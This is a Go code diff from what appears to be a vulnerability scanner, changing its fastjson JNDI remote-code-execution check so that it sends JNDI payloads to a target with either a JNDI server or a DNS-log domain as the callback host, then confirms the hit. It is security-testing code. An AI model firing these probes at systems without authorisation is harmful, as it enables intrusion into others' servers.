@@ -3,6 +3,7 @@ package fastjson
 import (
 	"fmt"
 	"github.com/veo/vscan/pkg"
+	"github.com/veo/vscan/pkg/jndi"
 	"net/url"
 	"regexp"
 	"strings"
@@ -13,14 +14,28 @@ func Check(u string, finalURL string) string {
 	for _, jsonurl := range domainx {
 		header := make(map[string]string)
 		header["Content-Type"] = "application/json"
-		if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
-			randomstr := pkg.RandomStr() + "fastjson"
+		randomstr := pkg.RandomStr()
+		if (pkg.CeyeApi != "" && pkg.CeyeDomain != "") || jndi.JndiAddress != "" {
 			for _, payload := range fastjsonJndiPayloads {
-				_, _ = pkg.HttpRequset(jsonurl, "POST", strings.Replace(payload, "dnslog-url", randomstr+"."+pkg.CeyeDomain, -1), false, header)
+				var uri string
+				if jndi.JndiAddress != "" {
+					uri = jndi.JndiAddress + "/" + randomstr + "/"
+				} else if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
+					uri = randomstr + "." + pkg.CeyeDomain
+				}
+				_, _ = pkg.HttpRequset(jsonurl, "POST", strings.Replace(payload, "dnslog-url", uri, -1), false, header)
 			}
-			if pkg.Dnslogchek(randomstr) {
-				pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
-				return "JNDI RCE"
+			if jndi.JndiAddress != "" {
+				if jndi.Jndilogchek(randomstr) {
+					pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
+					return "JNDI RCE"
+				}
+			}
+			if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
+				if pkg.Dnslogchek(randomstr) {
+					pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
+					return "JNDI RCE"
+				}
 			}
 		} else {
 			header["cmd"] = "echo jsonvuln"
